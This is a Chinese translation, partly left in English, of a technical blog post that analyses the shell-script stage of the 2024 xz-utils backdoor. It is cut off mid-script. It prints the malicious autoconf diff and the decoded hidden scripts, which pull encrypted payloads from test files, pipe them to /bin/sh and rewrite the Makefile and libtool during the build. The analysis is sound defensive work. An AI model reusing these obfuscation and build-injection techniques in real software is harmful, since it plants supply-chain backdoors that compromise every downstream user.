<!--yml

category: 未分类

日期：2024年5月27日 12:50:19

-->

# research!rsc: xz攻击shell脚本

> 来源：[https://research.swtch.com/xz-script](https://research.swtch.com/xz-script)

# xz攻击shell脚本

发布于2024年4月2日星期二。

更新于2024年4月3日星期三。

[## 简介](#introduction)

Andres Freund [公布了xz攻击的存在](https://www.openwall.com/lists/oss-security/2024/03/29/4)，于2024年3月29日发布到公共oss-security@openwall邮件列表中。一天前，他向Debian安全团队和（私人）distros@openwall邮件列表发出了警报。在他的邮件中，他说在“过去几周观察到Debian sid安装中liblzma（xz软件包的一部分）出现一些奇怪的症状（通过ssh登录消耗大量CPU，valgrind错误）”后，他深入研究了这个问题。

在高层次上，攻击分为两部分：一个shell脚本和一个目标文件。在`configure`期间注入了shell代码，这些代码将shell代码注入到`make`中。在`make`期间，shell代码将目标文件添加到构建中。本文将详细检查shell脚本。（另请参阅[我的时间线帖子](xz-timeline)。）

那个恶意的目标文件如果以`evil.o`的形式提交到仓库中会显得很可疑，因此恶意shell代码和目标文件都被嵌入、压缩和加密在一些二进制文件中，这些文件被添加为“某些新测试”的“测试输入”。测试文件目录早在贾谭到来之前就已经存在，并且README解释道：“这个目录包含了用来测试解码器实现中.xz、.lzma（LZMA_Alone）和.lz（lzip）文件处理的一堆文件。许多文件是通过十六进制编辑器手动创建的，因此没有比文件本身更好的‘源代码’。” 这对于像liblzma这样的解析库来说是生活的一部分。攻击者看起来只是在[添加一些新的测试文件](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0)。

不幸的是，那个恶意的目标文件出现了一个导致Valgrind出现问题的错误，因此需要更新测试文件以添加修复。[该提交](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1)解释道：“原始文件是在我的机器上生成的随机本地文件。为了将来更好地复制这些文件，使用了一个恒定的种子来重新创建这些文件。” 攻击者意识到他们需要一个更好的更新机制，因此新的恶意脚本包含了一个扩展机制，允许它在新的测试文件中寻找更新的脚本，这不会像重写现有文件那样引起太多注意。

这些脚本的效果是安排使恶意对象文件的`_get_cpuid`函数作为[GNU间接函数](https://sourceware.org/glibc/wiki/GNU_IFUNC)（ifunc）解析器的一部分调用。一般来说，这些解析器可以在程序执行的任何时候懒惰地调用，但基于安全原因，调用它们在动态链接期间（程序启动的早期阶段）全部调用已变得很流行，然后将[全局偏移表（GOT）和过程链接表（PLT）设置为只读](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)，以防止缓冲区溢出等能够编辑它。但恶意的ifunc解析器会早到足以编辑这些表，这正是后门引入的。然后，解析器会浏览这些表，寻找`RSA_public_decrypt`，并用一个恶意版本替换它，当正确的SSH证书被呈现时运行攻击者的代码。[链接](https://github.com/amlweems/xzbot)[](#configure)

## [配置](#configure)

此后，这篇文章将重点放在攻击的脚本方面。与大多数复杂的Unix软件一样，xz-utils使用GNU autoconf来决定如何在特定系统上构建自身。在普通操作中，autoconf会读取一个`configure.ac`文件，并生成一个`configure`脚本，可能还会引入支持脚本文件以提供“库”给该脚本。通常情况下，`configure`脚本及其支持库只会添加到tarball分发包中，而不会添加到源代码库中。xz分发包也是这样工作的。

攻击由攻击者向xz-5.6.0和xz-5.6.1的tarball分发中添加了一个意外的支持库`m4/build-to-host.m4`开始。与标准的`build-to-host.m4`相比，攻击者做出了以下更改：

```
diff --git a/build-to-host.m4 b/build-to-host.m4
index ad22a0a..d5ec315 100644
--- a/build-to-host.m4
+++ b/build-to-host.m4
@@ -1,5 +1,5 @@
-# build-to-host.m4 serial 3
-dnl Copyright (C) 2023 Free Software Foundation, Inc.
+# build-to-host.m4 serial 30
+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
 dnl with or without modifications, as long as this notice is preserved.
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],

   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  else
+    gl_[$1]_config=''
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])

 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl

```

总的来说，这是一组相当可信的差异，如果有人想检查的话。它提升了版本号，更新了版权年份以显得当前，并做了一些看起来不是很出格的难以理解的改变。

仔细看，有些地方不对劲。从底部开始，

```
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
if test -n "$gl_am_configmake"; then
  HAVE_PKG_CONFIGMAKE=1
else
  HAVE_PKG_CONFIGMAKE=0
fi

```

让我们看看分发中与模式匹配的文件有哪些（简化`grep`命令）：

```
% egrep -Rn '####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$'
Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches
%

```

这令人惊讶！因此，此脚本设置了`gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz`和`HAVE_PKG_CONFIGMAKE=1`。`gl_path_map`设置是一个[tr(1)](https://linux.die.net/man/1/tr)命令，它交换制表符和空格，并交换下划线和破折号。

现在阅读脚本的顶部，

```
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`

```

从该文件名中提取最后的点分隔元素，留下`xz`。也就是说，这是文件名的后缀，不是前缀，并且它是压缩命令的名称，很可能已经安装在任何构建机器上。

下一节是：

```
if test "x$gl_am_configmake" != "x"; then
  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
else
  gl_[$1]_config=''
fi

```

我们知道`gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz`，因此将这个`gl_[$1]_config`变量设置为该字符串

```
sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null

```

乍一看，特别是在原始引用形式中，`sed`命令看起来似乎与行尾有关，但实际上`r\n`是`sed`的“从文件`\n`读取”命令。由于文件`\n`不存在，该命令根本不起作用，然后由于`sed`没有以`-n`选项调用，`sed`打印输入的每一行。所以`sed "r\n"`只是一个混淆的`cat`命令，并记住`$gl_path_map`是之前的`tr`命令，而`$gl_[$1]_prefix`是`xz`。对于shell来说，这个命令实际上是

```
cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d

```

但现在它仍然只是一个字符串；它还没有被运行。这将在以下更改后发生

```
dnl If the host conversion code has been placed in $gl_config_gt,
dnl instead of duplicating it all over again into config.status,
dnl then we will have config.status run $gl_config_gt later, so it
dnl needs to know what name is stored there:
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])

```

最终的`"eval \$gl_[$1]_config"`运行该命令。如果我们在xz 5.6.0仓库上运行它，我们会得到：

```
$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +724)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31265|
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$

```

我已经插入了一些换行符，这样在网页中行不会太长。

为什么会有Hello和World？随测试文件附带的README文本有所描述：

> bad-3-corrupt_lzma2.xz文件包含三个流。第一个和第三个流是有效的xz流。中间的流具有正确的流头、块头、索引和流尾。只有LZMA2数据损坏了。如果使用`--single-stream`选项，该文件应该可以解压缩。

第一个和第三个流是Hello和World，而中间的流由于`tr`命令交换了字节值而被损坏。

回忆一下，xz 5.6.1附带了不同的“测试”文件，我们也可以尝试xz 5.6.1：

```
$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#�U��$�
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +939)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31233|
    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$

```

第一个不同之处在于脚本确保（非常确保！）如果不在Linux上运行则退出。第二个不同之处在于长的“`export i`”行在最终的head命令偏移量（724 vs 939）以及tail偏移量和`tr`参数中有所不同。让我们分析一下这些。

`head`命令打印其输入的前缀。让我们来看看开头：

```
(head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 && ...

```

这将丢弃标准输入的第一个千字节，打印接下来的两千字节，丢弃下一个千字节，然后打印接下来的两千字节。xz 5.6.1的完整命令是

```
(head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 &&
... 16 times total ...
head -c +939

```

shell变量`i`被设置为这个长命令。然后脚本运行：

```
xz -dc $srcdir/tests/files/good-large_compressed.lzma |
eval $i |
tail -c +31233 |
tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" |
xz -F raw --lzma1 -dc |
/bin/sh

```

第一个`xz`命令解压了另一个恶意测试文件。然后`eval`运行`head`管道，提取了16×2048+939 = 33,707字节。接着`tail`命令仅保留最后的31,233字节。`tr`命令对输出应用了简单的替换密码（以防有人想要从文件中提取这些特定的字节范围，他们将无法识别它作为有效的lzma输入！？）。第二个`xz`命令将翻译后的字节解码为原始的lzma流，然后当然结果通过shell管道处理。

跳过shell管道，我们可以运行这个命令，得到一个非常长的shell脚本。我在输出的各个部分之间添加了评论。

```
$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |
  eval $i |
  tail -c +31233 |
  tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
  xz -F raw --lzma1 -dc
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"

```

到目前为止，设置环境变量。

```
[ ! $(uname)="Linux" ] && exit 0  # 5.6.1 only

```

一个只出现在 5.6.1 版本中的行，在非 Linux 系统上运行时退出。一般来说，5.6.0 和 5.6.1 版本的脚本非常相似：5.6.1 有一些额外的添加。我们将检查 5.6.1 版本的脚本，并标记添加部分。这行是一个尝试的健壮性修复，但存在一个错误（Jakub Wilk 指出）：`= `周围没有空格，使该行成为一个无操作。

```
eval $zrKcVq

```

第一条奇怪的评估语句，用于那些看起来没有设置的变量。一种可能性是这些是调试打印语句：当攻击者调试脚本时，设置，比如 `zrKcVq=env` 在执行期间插入一个调试打印。另一种可能性是这些是可以由其他机制设置的扩展点，在将来运行在这段代码之前。

```
if test -f config.status; then
eval $zrKcSS
eval `grep ^LD=\'\/ config.status`
eval `grep ^CC=\' config.status`
eval `grep ^GCC=\' config.status`
eval `grep ^srcdir=\' config.status`
eval `grep ^build=\'x86_64 config.status`
eval `grep ^enable_shared=\'yes\' config.status`
eval `grep ^enable_static=\' config.status`
eval `grep ^gl_path_map=\' config.status`

```

如果存在 `config.status`，我们从中读取各种变量到 shell 中，以及两个扩展点。请注意，我们仍然在 config.status 检查内部（我们称之为“if #1”），当我们继续处理输出时。

```
# Entirely new in 5.6.1
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi

```

这个部分在 5.6.1 版本中完全是新内容。它寻找一个单独的测试文件，包含魔术文本 `'~!:_ W'` 和 `'|_!{ -'`，提取它们之间的字节，应用替代密码，解压缩结果，并评估输出为一个 shell 脚本。这似乎是一个扩展机制，所以下次需要在这个脚本中进行更改时，可以在不同的测试文件中添加新脚本，而不是[编造理由重新生成现有的二进制测试文件](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1)。

接下来的代码块继续使用在 5.6.0 版本中存在的脚本。

```
eval $zrKccj
if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
exit 0
fi
if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
exit 0
fi

```

两个不同的检查，确保启用了 [GNU indirect function](https://maskray.me/blog/2021-01-18-gnu-indirect-function) 支持。如果没有，则停止脚本。后门需要此功能。

```
if test "x$enable_shared" != "xyes";then
exit 0
fi

```

要求支持共享库。

```
if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
exit 0
fi

```

要求一个 x86-64 Linux 系统。

```
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi

```

要求所有 crc ifunc 代码（万一已经被修补？）。

```
if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
exit 0
fi
if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
exit 0
fi

```

要求使用 gcc（不是 clang，我想），以及 GNU ld。

```
if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
exit 0
fi

```

要求包含后门的测试文件。当然，如果这些文件不存在，不清楚我们如何首次获得这个脚本，但我想宁愿安全也不要后悔。

```
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
eval $zrKcst

```

添加一堆检查，当文件 `debian/rules` 存在或者 `$RPM_ARCH` 设置为 `x86_64`。请注意，我们现在在两个 `if` 语句内部：上面的 config.status 检查，以及这个（我们称之为“if #2”）。

```
j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
z="^am__uninstall_files_from_dir = {"
if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
w="^am__install_max ="
if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
E=$z
if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
Q="^am__vpath_adj_setup ="
if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
M="^am__include = include"
if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
L="^all: all-recursive$"
if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi

```

检查 `liblzma/Makefile` 是否包含所有将用作将新文本插入 Makefile 锚点的行。

```
if ! grep -qs "$O" libtool > /dev/null 2>&1;then
exit 0
fi

```

`$O` 在脚本的开头设置。这是检查 libtool 文件是否在构建过程中生成，为 PIC（位置独立代码）构建配置编译器。

```
eval $zrKcTy
b="am__test = $U"

```

`$U` 也在脚本的开头设置为：`U="bad-3-corrupt_lzma2.xz"`。真正的工作开始了！

```
sed -i "/$j/i$b" src/liblzma/Makefile || true

```

`sed -i` 对输入文件进行原地修改，在本例中是 `liblzma/Makefile`。具体来说，找到我们之前用 `/$j/` grep 的 `ACLOCAL_M4` 行，并从 `$b` 中插入 `am__test` 设置 (`i$b`)。

```
d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true

```

Makefile 中一个引用字符串中的 Shell 引用确实是非常特殊的。这是通过在 `tr` 命令中适当多次转义反斜杠，使其在 `am__install_max` 行后能够插入到 Makefile 中的操作。

```
b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true

```

添加更多的行。停下来看看到目前为止发生了什么是值得的。脚本已将以下行添加到 `src/liblzma/Makefile` 中：

```
am__test = bad-3-corrupt_lzma2.xz
am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
am__dist_setup = $(am_strip_prefix) | xz -d 2>/dev/null | $(SHELL)
am__test_dir = $(top_srcdir)/tests/files/$(am__test)

```

这些看起来很合理，但在仔细检查下就会破绽百出：例如，`am__test_dir` 是一个文件，而不是一个目录。这里的目标似乎是在 `configure` 运行后，生成的 `Makefile` 仍然看起来像是难以理解的。而且这些行被分散地添加到 `Makefile` 的各个地方；没有人会像在这里的展示中那样看到它们全部在一起。回到脚本本身：

```
h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true

```

向 Makefile 中添加 `liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X`。如果 `LDFLAGS` 中没有 `-z,now` 或 `-Wl,now`，则添加 `-z,now`。

“`-Wl,now`” 强制 `LD_BIND_NOW` 行为，在程序启动时动态加载器解析所有符号。通常这样做的一个原因是出于安全考虑：它确保全局偏移表和过程链接表在进程启动早期就能被标记为只读，从而防止缓冲区溢出或释放后写入错误的问题。然而，这也会在启动过程中运行 GNU 间接函数（ifunc）解析器，并且后门会安排在其中一个解析过程中被调用。这种早期调用后门设置允许它在表仍然可写时运行，从而使后门可以替换 `RSA_public_decrypt` 的入口为自己的版本。但我们得回到脚本本身：

```
sed -i "s/$O/$C/g" libtool || true

```

我们之前检查了 libtool 文件中是否说 `pic_flag=" -fPIC -DPIC"`。sed 命令将其修改为 `pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"`。

并不清楚这些额外标志为何如此重要，但通常它们会禁用链接器优化，这可能会妨碍诡计。

```
k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD

```

Shell 引用继续令人迷惑，但我们已经达到最终的更改。这添加了以下一行：

```
AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))

```

添加到 Makefile 的一个地方，然后添加一个设置了一些变量的长脚本，完全是误导，以以下内容结尾：

```
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1

```

`sed rpath` 命令和 `sed "r\n"` 一样是一个模糊的 `cat`，但 `-rpath` 是一个非常常见的链接标志，所以乍一看你可能不会注意到它跟错误的命令在一起。回想起前面添加的 `am__test` 和相关行，这个管道最终相当于：

```
cat ./tests/files/bad-3-corrupt_lzma2.xz |
tr "\t \-_" " \t_\-" |
xz -d |
/bin/sh

```

我们的老朋友！我们知道这样做的原因，尽管如此。它运行了我们当前在这篇文章中阅读的脚本本身。[多么递归！](https://research.swtch.com/zip)[](#make)

## [Make](#make)

Instead of running during `configure` in the tarball root directory, let's mentally re-execute the script as it would run during `make` in the `liblzma` directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding `./config.status`. Now let's keep executing the script.

```
fi

```

That `fi` closes “if #2”, which checked for a Debian or RPM build. The upcoming `elif` continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during `make` in the `liblzma` directory:

```
elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then

```

If we see the built objects for the crc code, we are running as part of `make`. Run the following code.

```
# Entirely new in 5.6.1
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi

```

We start this section with another extension hook. This time the magic strings are `'jV!.^%'` and `'%.R.1Z'`. As before, there are no test files with these strings. This was for future extensibility.

On to the code shared with 5.6.0:

```
eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi

```

Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed `crc_clmul.c` to `crc_x86_clmul.h` [on 2024-01-11](https://git.tukaani.org/?p=xz.git;a=commit;h=419f55f9dfc2df8792902b8953d50690121afeea). One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked `crc_clmul.c`. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!

```
if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
exit 0
fi

```

Check that the build configuration has the extra flags we added before.

```
if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
exit 0
fi

```

Check that no one has added `lazy` to the linker options, which might override the `-Wl,now`. (This code really needs to run before the tables it patches get marked read-only!)

```
N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88664
else
N=88664
W=0
fi

```

This is selecting between two different offset values depending on the content of `gettext.m4`. The distributed xz tarballs do not contain that string in `gettext.m4` (it does appear in `build-to-host.m4`), so the `grep` finds nothing, `$Y` is the empty string, and the true case of the `if` executes: `N=0` and `W=88792`.

```
xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |

```

I inserted a line break here. Remember the “corrupt” test file script set `i` to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:

```
LC_ALL=C awk '
BEGIN{
    FS="\n";RS="\n";ORS="";m=256;
    for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}
    i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}
}
{
